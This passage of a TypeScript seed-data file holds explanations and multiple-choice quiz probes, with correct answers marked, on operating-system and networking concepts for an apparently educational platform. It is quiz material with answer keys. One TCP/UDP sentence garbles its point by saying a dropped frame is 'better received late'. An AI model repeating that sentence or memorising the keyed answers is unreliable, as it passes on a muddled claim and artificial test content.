      { text: 'Deadlock — circular wait between two threads', isCorrect: true },
      { text: 'Race condition — outcome depends on scheduling order', isCorrect: false, misconceptionId: `${SYNCDEAD}:M1` },
      { text: 'Starvation — one thread never gets scheduled', isCorrect: false },
    ], correctValue: 'Deadlock', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${SYNCDEAD}:M1`], source: SYNCDEAD_SRC },
  { conceptId: SYNCDEAD, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Can using mutexes (locks) cause a deadlock?',
    choices: [
      { text: 'Yes — circular lock acquisition order creates deadlocks between threads', isCorrect: true },
      { text: 'No — locks are designed to prevent all concurrency problems including deadlocks', isCorrect: false, misconceptionId: `${SYNCDEAD}:M1` },
    ], correctValue: 'Yes — locks can cause deadlocks', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${SYNCDEAD}:M1`], source: SYNCDEAD_SRC },
]

const MEMMGMT = 'cs.os.memory-management-os'
const MEMMGMT_SRC = 'docs/computer-science/kg/graph.json — cs.os.memory-management-os'
const MEMMGMT_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: MEMMGMT, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'The OS divides memory into segments allocated to processes. Paging: physical memory split into fixed-size frames; logical memory split into pages of the same size; a page table maps logical pages to physical frames — eliminates external fragmentation. Segmentation: variable-size segments (code, data, stack) matching program structure. The heap holds dynamically allocated objects; the stack holds function frames. Memory allocation: malloc/free (C); Python\'s memory manager uses reference counting + generational garbage collector to reclaim objects with no live references.',
    targetedMisconceptions: [`${MEMMGMT}:M1`], source: MEMMGMT_SRC },
  { conceptId: MEMMGMT, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "Python automatically prevents memory leaks." Python\'s reference counting frees most objects promptly, but reference cycles (A→B→A) are not collected by reference counting alone. Python\'s cyclic garbage collector handles cycles, but it runs periodically — not immediately. True leaks occur when references are held unnecessarily (e.g., a list that keeps growing, global caches without eviction). Memory profiling tools (tracemalloc, memory_profiler) are needed to find real leaks.',
    targetedMisconceptions: [`${MEMMGMT}:M1`], source: MEMMGMT_SRC },
]
const MEMMGMT_PROBES: SeedProbe[] = [
  { conceptId: MEMMGMT, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Paging eliminates external fragmentation. How?',
    choices: [
      { text: 'Fixed-size frames mean any free frame fits any page — no gaps of unusable size', isCorrect: true },
      { text: 'Pages are stored contiguously so no gaps form', isCorrect: false, misconceptionId: `${MEMMGMT}:M1` },
    ], correctValue: 'Fixed-size frames always fit pages', difficulty: ProbeDifficulty.ADVANCED, targetedMisconceptions: [`${MEMMGMT}:M1`], source: MEMMGMT_SRC },
  { conceptId: MEMMGMT, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Can Python programs leak memory despite automatic garbage collection?',
    choices: [
      { text: 'Yes — reference cycles and unintentional long-lived references can prevent reclamation', isCorrect: true },
      { text: 'No — Python\'s GC guarantees all unreachable objects are freed immediately', isCorrect: false, misconceptionId: `${MEMMGMT}:M1` },
    ], correctValue: 'Yes — leaks are possible', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${MEMMGMT}:M1`], source: MEMMGMT_SRC },
]

const VIRTMEM = 'cs.os.virtual-memory'
const VIRTMEM_SRC = 'docs/computer-science/kg/graph.json — cs.os.virtual-memory'
const VIRTMEM_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: VIRTMEM, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Virtual memory gives each process the illusion of a large private address space. The OS uses demand paging: pages are loaded into RAM only when accessed (page fault → OS loads page from disk). When RAM is full, a page replacement algorithm evicts a page to disk (swap). Algorithms: FIFO, LRU (evict least recently used — most common), Clock (approximate LRU). Thrashing: process spends more time paging than executing — too many page faults because working set doesn\'t fit in RAM. The Memory Management Unit (MMU) translates virtual→physical addresses in hardware.',
    targetedMisconceptions: [`${VIRTMEM}:M1`], source: VIRTMEM_SRC },
  { conceptId: VIRTMEM, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "More swap space gives the same performance as more RAM." Swap is disk storage — thousands of times slower than RAM. Running with a full working set in swap causes thrashing (constant page faults at disk speed). Swap is a safety net for occasional overflows, not a RAM replacement. When a system is heavily swapping, the only real fixes are adding RAM or reducing memory usage.',
    targetedMisconceptions: [`${VIRTMEM}:M1`], source: VIRTMEM_SRC },
]
const VIRTMEM_PROBES: SeedProbe[] = [
  { conceptId: VIRTMEM, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'What is a page fault?',
    choices: [
      { text: 'A hardware interrupt when a process accesses a page not currently in RAM', isCorrect: true },
      { text: 'A memory corruption error caused by accessing an invalid pointer', isCorrect: false, misconceptionId: `${VIRTMEM}:M1` },
    ], correctValue: 'Page not in RAM — OS loads it from disk', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${VIRTMEM}:M1`], source: VIRTMEM_SRC },
  { conceptId: VIRTMEM, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'A server is running slowly and the OS reports heavy swap usage. Will adding 100GB more swap fix the performance?',
    choices: [
      { text: 'No — swap is disk-speed; the bottleneck is RAM, not swap space', isCorrect: true },
      { text: 'Yes — more swap gives more memory space and eliminates the bottleneck', isCorrect: false, misconceptionId: `${VIRTMEM}:M1` },
    ], correctValue: 'No — need more RAM', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${VIRTMEM}:M1`], source: VIRTMEM_SRC },
]

const FILESYS = 'cs.os.file-systems'
const FILESYS_SRC = 'docs/computer-science/kg/graph.json — cs.os.file-systems'
const FILESYS_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: FILESYS, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'A file system organises data on storage into files and directories. Key concepts: inode (metadata block holding file size, permissions, timestamps, and pointers to data blocks — not the filename), directory (maps names to inodes), hard link (two directory entries pointing to the same inode), symbolic (soft) link (a file containing a path). File allocation: contiguous (fast sequential read, external fragmentation), linked (blocks chain together, no fragmentation, slow random access), indexed (inode holds block pointers — Unix ext* uses this). Journaling (ext4, NTFS) logs intended changes before writing — enables crash recovery.',
    targetedMisconceptions: [`${FILESYS}:M1`], source: FILESYS_SRC },
  { conceptId: FILESYS, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "Deleting a file immediately removes its data from disk." Deletion removes the directory entry pointing to the inode. If the inode\'s reference count drops to zero, the blocks are marked free — but the data bytes remain until overwritten. This is why file recovery software works: the blocks are still there. Secure deletion requires overwriting the data blocks (shred, secure-delete tools). On SSDs, TRIM marks blocks as free to the controller, but timing of actual erasure is firmware-dependent.',
    targetedMisconceptions: [`${FILESYS}:M1`], source: FILESYS_SRC },
]
const FILESYS_PROBES: SeedProbe[] = [
  { conceptId: FILESYS, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'An inode stores which of the following?',
    choices: [
      { text: 'File metadata (size, permissions, timestamps) and pointers to data blocks — but NOT the filename', isCorrect: true },
      { text: 'The filename and file contents together', isCorrect: false, misconceptionId: `${FILESYS}:M1` },
    ], correctValue: 'Metadata and block pointers, not filename', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${FILESYS}:M1`], source: FILESYS_SRC },
  { conceptId: FILESYS, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'After deleting a sensitive file, is its data immediately unrecoverable?',
    choices: [
      { text: 'No — data blocks remain on disk until overwritten; file recovery tools can retrieve them', isCorrect: true },
      { text: 'Yes — deletion immediately erases the file\'s bytes', isCorrect: false, misconceptionId: `${FILESYS}:M1` },
    ], correctValue: 'No — data persists until overwritten', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${FILESYS}:M1`], source: FILESYS_SRC },
]

// ─── cs.net ───────────────────────────────────────────────────────────────────
const NETBASICS = 'cs.net.networking-basics'
const NETBASICS_SRC = 'docs/computer-science/kg/graph.json — cs.net.networking-basics'
const NETBASICS_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: NETBASICS, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'A network connects devices to share resources. LAN (Local Area Network) — same building; WAN (Wide Area Network) — geographically distributed, e.g. the internet. Network topology: bus, ring, star, mesh. Bandwidth: maximum data rate (bps). Latency: delay between send and receive. Throughput: actual sustained transfer rate (≤ bandwidth). Packet switching: data split into packets, each routed independently and reassembled at destination — contrasts with circuit switching (dedicated path for duration of call, used in traditional telephony).',
    targetedMisconceptions: [`${NETBASICS}:M1`], source: NETBASICS_SRC },
  { conceptId: NETBASICS, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "Bandwidth and speed are the same thing." Bandwidth is the capacity of a channel (maximum rate). Latency is delay per packet. Throughput is the actual rate achieved. A high-bandwidth, high-latency link (satellite: 100 Mbps bandwidth, 600ms latency) FEELS slow for interactive use (each click waits 600ms) but can transfer large files quickly. A low-latency, low-bandwidth link (4G: 30ms, 10 Mbps) feels responsive but transfers large files slowly. Gaming needs low latency; file downloads need high bandwidth.',
    targetedMisconceptions: [`${NETBASICS}:M1`], source: NETBASICS_SRC },
]
const NETBASICS_PROBES: SeedProbe[] = [
  { conceptId: NETBASICS, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'A satellite link has 100 Mbps bandwidth but 600ms latency. Why does video gaming feel laggy despite high bandwidth?',
    choices: [
      { text: 'High latency means each input/response cycle takes 600ms regardless of bandwidth', isCorrect: true },
      { text: 'Bandwidth is too low for gaming packet sizes', isCorrect: false, misconceptionId: `${NETBASICS}:M1` },
    ], correctValue: 'High latency causes lag', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${NETBASICS}:M1`], source: NETBASICS_SRC },
  { conceptId: NETBASICS, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'What is the difference between bandwidth and throughput?',
    choices: [
      { text: 'Bandwidth is maximum capacity; throughput is actual sustained transfer rate (≤ bandwidth)', isCorrect: true },
      { text: 'They are the same — both measure network speed in bps', isCorrect: false, misconceptionId: `${NETBASICS}:M1` },
    ], correctValue: 'Capacity vs actual rate', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${NETBASICS}:M1`], source: NETBASICS_SRC },
]

const OSITCPIP = 'cs.net.osi-tcp-ip-models'
const OSITCPIP_SRC = 'docs/computer-science/kg/graph.json — cs.net.osi-tcp-ip-models'
const OSITCPIP_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: OSITCPIP, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'OSI model: 7 layers (Physical → Data Link → Network → Transport → Session → Presentation → Application). Each layer adds a header during encapsulation. TCP/IP model: 4 layers (Link → Internet → Transport → Application) — the practical Internet stack. Mapping: Application (OSI 5-7) → Application (TCP/IP); Transport (OSI 4) → Transport; Network (OSI 3) → Internet; Data Link + Physical (OSI 1-2) → Link. Key protocol-to-layer: HTTP/HTTPS/DNS/SMTP → Application; TCP/UDP → Transport; IP → Internet; Ethernet/WiFi → Link.',
    targetedMisconceptions: [`${OSITCPIP}:M1`], source: OSITCPIP_SRC },
  { conceptId: OSITCPIP, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "The OSI model describes how the internet actually works." OSI is a conceptual reference model — the internet runs on TCP/IP, not OSI. OSI was a competing standard that lost; TCP/IP won. OSI is taught because its 7 layers provide a precise vocabulary for discussing protocol responsibilities. Real internet implementations blur OSI layer boundaries (TLS spans OSI layers 4-6; HTTP/2 has session-like features in the application layer).',
    targetedMisconceptions: [`${OSITCPIP}:M1`], source: OSITCPIP_SRC },
]
const OSITCPIP_PROBES: SeedProbe[] = [
  { conceptId: OSITCPIP, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'At which OSI layer does IP (Internet Protocol) operate?',
    choices: [
      { text: 'Layer 3 — Network', isCorrect: true },
      { text: 'Layer 4 — Transport', isCorrect: false, misconceptionId: `${OSITCPIP}:M1` },
      { text: 'Layer 7 — Application', isCorrect: false },
    ], correctValue: 'Layer 3 Network', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${OSITCPIP}:M1`], source: OSITCPIP_SRC },
  { conceptId: OSITCPIP, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Does the internet run on the OSI model?',
    choices: [
      { text: 'No — the internet runs TCP/IP; OSI is a reference model for education/discussion', isCorrect: true },
      { text: 'Yes — all internet hardware and protocols follow the 7-layer OSI stack', isCorrect: false, misconceptionId: `${OSITCPIP}:M1` },
    ], correctValue: 'No — TCP/IP model', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${OSITCPIP}:M1`], source: OSITCPIP_SRC },
]

const IPADDRSS = 'cs.net.ip-addressing'
const IPADDRSS_SRC = 'docs/computer-science/kg/graph.json — cs.net.ip-addressing'
const IPADDRSS_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: IPADDRSS, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'IPv4 addresses are 32-bit numbers written as four octets (e.g. 192.168.1.1). CIDR notation /n means the first n bits are the network address; the remaining bits identify hosts. 192.168.1.0/24 → 256 addresses, 254 usable hosts. Private ranges (RFC 1918): 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16 — not routable on the internet; NAT translates them. IPv6: 128-bit, written as 8 groups of hex (2001:db8::1); solves IPv4 exhaustion. Subnetting splits a network block into smaller subnets.',
    targetedMisconceptions: [`${IPADDRSS}:M1`], source: IPADDRSS_SRC },
  { conceptId: IPADDRSS, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "192.168.x.x is my computer\'s real internet address." 192.168.x.x is a private address — only reachable within your LAN. Your router performs NAT (Network Address Translation), mapping many private addresses to one public IP. The internet sees your router\'s public IP. This is why two devices on the same WiFi share the same public IP but have different local IPs.',
    targetedMisconceptions: [`${IPADDRSS}:M1`], source: IPADDRSS_SRC },
]
const IPADDRSS_PROBES: SeedProbe[] = [
  { conceptId: IPADDRSS, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'A /24 subnet contains how many usable host addresses?',
    choices: [
      { text: '254 (256 total − network address − broadcast)', isCorrect: true },
      { text: '256', isCorrect: false, misconceptionId: `${IPADDRSS}:M1` },
      { text: '24', isCorrect: false },
    ], correctValue: '254', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${IPADDRSS}:M1`], source: IPADDRSS_SRC },
  { conceptId: IPADDRSS, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Is 192.168.1.50 a valid public internet-routable IP address?',
    choices: [
      { text: 'No — 192.168.x.x is a private (RFC 1918) address; NAT translates it to a public IP', isCorrect: true },
      { text: 'Yes — all IP addresses are publicly routable', isCorrect: false, misconceptionId: `${IPADDRSS}:M1` },
    ], correctValue: 'No — private address', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${IPADDRSS}:M1`], source: IPADDRSS_SRC },
]

const DNSDHCP = 'cs.net.dns-dhcp'
const DNSDHCP_SRC = 'docs/computer-science/kg/graph.json — cs.net.dns-dhcp'
const DNSDHCP_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: DNSDHCP, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'DNS (Domain Name System) translates human-readable names (google.com) to IP addresses. Hierarchical: root servers → TLD servers (.com) → authoritative name servers for the domain. A record: name → IPv4. AAAA: name → IPv6. CNAME: alias to another name. MX: mail server. DNS responses are cached by TTL. DHCP (Dynamic Host Configuration Protocol) automatically assigns IP addresses, subnet mask, default gateway, and DNS server to devices when they join a network — eliminating manual IP configuration.',
    targetedMisconceptions: [`${DNSDHCP}:M1`], source: DNSDHCP_SRC },
  { conceptId: DNSDHCP, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "DNS changes take effect immediately." DNS responses are cached for their TTL (Time To Live) — from 60 seconds to 48 hours. After changing a DNS record, old records persist in caches worldwide until TTL expires. Best practice: lower TTL to 60s 24h before a planned IP change; after confirming new IP works, raise TTL back. "Why is my new server not resolving yet" is almost always a caching delay.',
    targetedMisconceptions: [`${DNSDHCP}:M1`], source: DNSDHCP_SRC },
]
const DNSDHCP_PROBES: SeedProbe[] = [
  { conceptId: DNSDHCP, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'What type of DNS record maps a domain name to an IPv4 address?',
    choices: [
      { text: 'A record', isCorrect: true },
      { text: 'MX record', isCorrect: false },
      { text: 'CNAME record', isCorrect: false },
      { text: 'AAAA record', isCorrect: false, misconceptionId: `${DNSDHCP}:M1` },
    ], correctValue: 'A record', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${DNSDHCP}:M1`], source: DNSDHCP_SRC },
  { conceptId: DNSDHCP, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'You updated your site\'s DNS A record 5 minutes ago but some users still reach the old server. Why?',
    choices: [
      { text: 'DNS caches hold old records until their TTL expires — propagation takes time', isCorrect: true },
      { text: 'DNS updates are applied only once per day on a fixed schedule', isCorrect: false },
    ], correctValue: 'TTL caching delay', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${DNSDHCP}:M1`], source: DNSDHCP_SRC },
]

const APPPROTO = 'cs.net.application-protocols'
const APPPROTO_SRC = 'docs/computer-science/kg/graph.json — cs.net.application-protocols'
const APPPROTO_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: APPPROTO, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Application layer protocols define the language between applications. HTTP (port 80): stateless request/response; methods GET, POST, PUT, DELETE, PATCH; status codes 2xx success, 3xx redirect, 4xx client error, 5xx server error. HTTPS (port 443): HTTP over TLS — encrypted and authenticated. SMTP (port 25): email sending. IMAP/POP3: email retrieval. FTP (port 21): file transfer (unencrypted — use SFTP). SSH (port 22): encrypted remote shell. Each protocol is a precise specification of message format and sequence.',
    targetedMisconceptions: [`${APPPROTO}:M1`], source: APPPROTO_SRC },
  { conceptId: APPPROTO, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "HTTPS is a different protocol from HTTP." HTTPS is HTTP with TLS encryption layered underneath — the HTTP messages are identical; TLS encrypts them in transit. The padlock icon means the CHANNEL is encrypted, not that the website is trustworthy. A phishing site can have a valid TLS certificate and show a padlock. HTTPS prevents eavesdropping and tampering; it does not validate the site\'s intentions.',
    targetedMisconceptions: [`${APPPROTO}:M1`], source: APPPROTO_SRC },
]
const APPPROTO_PROBES: SeedProbe[] = [
  { conceptId: APPPROTO, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'An HTTP response returns status 404. What does this mean?',
    choices: [
      { text: 'Client error — the requested resource was not found on the server', isCorrect: true },
      { text: 'Server error — the server crashed processing the request', isCorrect: false, misconceptionId: `${APPPROTO}:M1` },
      { text: 'Success — the resource was deleted as requested', isCorrect: false },
    ], correctValue: 'Resource not found (client error)', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${APPPROTO}:M1`], source: APPPROTO_SRC },
  { conceptId: APPPROTO, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'A website shows a padlock (HTTPS). Does this guarantee the website is safe to trust?',
    choices: [
      { text: 'No — HTTPS only encrypts the channel; the site could still be a phishing site with a valid certificate', isCorrect: true },
      { text: 'Yes — only legitimate trusted organisations can get HTTPS certificates', isCorrect: false, misconceptionId: `${APPPROTO}:M1` },
    ], correctValue: 'No — encryption ≠ legitimacy', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${APPPROTO}:M1`], source: APPPROTO_SRC },
]

const TCPUDP = 'cs.net.tcp-udp-transport'
const TCPUDP_SRC = 'docs/computer-science/kg/graph.json — cs.net.tcp-udp-transport'
const TCPUDP_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: TCPUDP, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'TCP (Transmission Control Protocol): connection-oriented (3-way handshake: SYN, SYN-ACK, ACK), reliable (ACKs, retransmits lost packets), ordered (sequence numbers), flow-controlled and congestion-controlled. Use: HTTP/HTTPS, email, file transfer — anything where data integrity matters. UDP (User Datagram Protocol): connectionless, no ACKs, no ordering guarantees, low overhead. Use: video streaming, DNS queries, online gaming, VoIP — where speed matters more than perfection and the application handles any needed reliability. UDP headers are 8 bytes; TCP headers 20+ bytes.',
    targetedMisconceptions: [`${TCPUDP}:M1`], source: TCPUDP_SRC },
  { conceptId: TCPUDP, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "UDP is unreliable, so it\'s always the worse choice." UDP\'s lack of reliability IS the point — it eliminates round-trip acknowledgement delays. For live video, a dropped frame is better received late because late video is useless. DNS uses UDP because a retry of a single small query is cheaper than a full TCP handshake. Modern protocols like QUIC build reliability selectively on top of UDP to avoid TCP head-of-line blocking. UDP is a deliberately minimal tool for use cases that need control.',
    targetedMisconceptions: [`${TCPUDP}:M1`], source: TCPUDP_SRC },
]
const TCPUDP_PROBES: SeedProbe[] = [
  { conceptId: TCPUDP, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'A live video call drops 2% of packets. Should TCP or UDP be used, and why?',
    choices: [
      { text: 'UDP — late retransmitted packets are useless for live audio/video; drop and continue', isCorrect: true },
      { text: 'TCP — retransmission ensures no quality loss', isCorrect: false, misconceptionId: `${TCPUDP}:M1` },
    ], correctValue: 'UDP — latency > reliability for live media', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${TCPUDP}:M1`], source: TCPUDP_SRC },
  { conceptId: TCPUDP, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'What happens during TCP\'s 3-way handshake before data is sent?',
    choices: [
      { text: 'Client sends SYN, server replies SYN-ACK, client replies ACK — establishing the connection', isCorrect: true },
      { text: 'Both sides send their data simultaneously and then verify receipt', isCorrect: false },
    ], correctValue: 'SYN → SYN-ACK → ACK', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${TCPUDP}:M1`], source: TCPUDP_SRC },
]

const ROUTCONG = 'cs.net.routing-congestion'
const ROUTCONG_SRC = 'docs/computer-science/kg/graph.json — cs.net.routing-congestion'
const ROUTCONG_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: ROUTCONG, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Routing determines the path packets take through a network. Static routing: manually configured; dynamic routing: protocols adapt to topology changes. OSPF (link-state: each router builds a full topology map) and BGP (path-vector: internet\'s inter-domain protocol, used between ISPs). TCP congestion control prevents overwhelming links: slow start (exponential increase), congestion avoidance (linear), fast retransmit/recovery on packet loss. Congestion window (cwnd) limits unacknowledged data in flight.',
    targetedMisconceptions: [`${ROUTCONG}:M1`], source: ROUTCONG_SRC },
  { conceptId: ROUTCONG, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "Packets in a TCP connection always take the same route." Each IP packet is routed independently; different packets in the same TCP connection can take different paths and arrive out of order. TCP sequence numbers allow the receiver to reassemble them correctly. This also means that latency can vary between packets — jitter — which is why TCP\'s delay profile can be variable even on stable connections.',
    targetedMisconceptions: [`${ROUTCONG}:M1`], source: ROUTCONG_SRC },
]
const ROUTCONG_PROBES: SeedProbe[] = [
  { conceptId: ROUTCONG, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'TCP slow start begins by sending 1 segment and doubles the window each RTT. What triggers transition to congestion avoidance?',
    choices: [
      { text: 'The congestion window reaches the slow-start threshold (ssthresh)', isCorrect: true },
      { text: 'Slow start runs for exactly 3 seconds', isCorrect: false },
      { text: 'The first packet loss occurs', isCorrect: false, misconceptionId: `${ROUTCONG}:M1` },
    ], correctValue: 'cwnd reaches ssthresh', difficulty: ProbeDifficulty.ADVANCED, targetedMisconceptions: [`${ROUTCONG}:M1`], source: ROUTCONG_SRC },
  { conceptId: ROUTCONG, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Do all packets of a TCP connection travel along the same network path?',
    choices: [
      { text: 'Not necessarily — each IP packet is routed independently and may take different paths', isCorrect: true },
      { text: 'Yes — TCP establishes a dedicated circuit for the connection\'s duration', isCorrect: false, misconceptionId: `${ROUTCONG}:M1` },
    ], correctValue: 'No — per-packet routing', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${ROUTCONG}:M1`], source: ROUTCONG_SRC },
]

const WIRENET = 'cs.net.wireless-mobile-networks'
const WIRENET_SRC = 'docs/computer-science/kg/graph.json — cs.net.wireless-mobile-networks'
const WIRENET_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: WIRENET, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'WiFi (IEEE 802.11) uses radio frequencies (2.4 GHz / 5 GHz / 6 GHz) for wireless LAN. CSMA/CA (Carrier Sense Multiple Access with Collision Avoidance) — listen before transmitting, back off randomly on collision (unlike Ethernet\'s CSMA/CD which detects after collision). Cellular: 4G LTE provides ~10-50 Mbps mobile broadband; 5G adds mmWave bands for Gbps speeds with lower latency. Mobile devices use handoff — seamlessly switching base stations as they move. Wireless is inherently shared and error-prone; encryption (WPA3) and error correction (FEC) compensate.',
    targetedMisconceptions: [`${WIRENET}:M1`], source: WIRENET_SRC },
  { conceptId: WIRENET, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "5G is just faster 4G." 5G introduces three distinct bands: low (coverage, similar speed to 4G), mid (the main 5G rollout — 100-400 Mbps), and mmWave (Gbps speeds, centimetre range, needs direct line of sight). Most users on "5G" are on mid-band. Beyond speed, 5G\'s key features are ultra-low latency (1ms target) for IoT/autonomous vehicles and network slicing (virtual private networks for different use cases on shared infrastructure).',
    targetedMisconceptions: [`${WIRENET}:M1`], source: WIRENET_SRC },
]
const WIRENET_PROBES: SeedProbe[] = [
  { conceptId: WIRENET, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Why does WiFi use CSMA/CA rather than CSMA/CD?',
    choices: [
      { text: 'Wireless devices cannot reliably detect collisions while transmitting — avoidance is the only option', isCorrect: true },
      { text: 'CA is faster than CD because it never has collisions', isCorrect: false, misconceptionId: `${WIRENET}:M1` },
    ], correctValue: 'Cannot detect own collision wirelessly', difficulty: ProbeDifficulty.ADVANCED, targetedMisconceptions: [`${WIRENET}:M1`], source: WIRENET_SRC },
  { conceptId: WIRENET, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'A user claims 5G will give them Gbps speeds everywhere. Is this accurate?',
    choices: [
      { text: 'No — Gbps requires mmWave 5G which has very short range; most 5G rollouts use mid-band at 100-400 Mbps', isCorrect: true },
      { text: 'Yes — 5G is defined as Gbps speeds universally', isCorrect: false, misconceptionId: `${WIRENET}:M1` },
    ], correctValue: 'No — Gbps only on mmWave, short range', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${WIRENET}:M1`], source: WIRENET_SRC },
]

const CLOUD = 'cs.net.cloud-computing'
const CLOUD_SRC = 'docs/computer-science/kg/graph.json — cs.net.cloud-computing'
const CLOUD_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: CLOUD, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
